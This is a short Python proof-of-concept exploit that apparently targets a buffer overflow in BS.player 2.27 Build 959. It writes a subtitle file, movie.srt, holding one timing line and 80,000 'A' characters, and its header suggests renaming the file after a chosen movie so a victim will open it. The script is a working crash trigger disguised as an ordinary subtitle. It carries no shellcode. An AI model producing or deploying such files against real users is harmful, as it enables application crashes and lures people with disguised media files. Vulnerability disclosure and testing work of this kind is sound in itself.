#!/usr/bin/python
#
# BS.player 2.27 Build 959 SRT Buffer Overflow
# Just rename movie.srt file with the name of the movie you like...
#
# Vulnerability discovered by Muris Kurgas a.k.a j0rgan
# jorganwd [at] gmail [dot] com

# http://www.jorgan.users.cg.yu
#
# bolexxx, learn something, ladies will come soon or l8r man!
# red pill rocks!
# no muts, no pain :)

import os

bafer = 'A' * 80000

fileHandle = open ( 'movie.srt', 'w' )
fileHandle.write ( '1\n00:00:01,001 --> 00:00:05,099\n'+bafer )
fileHandle.close()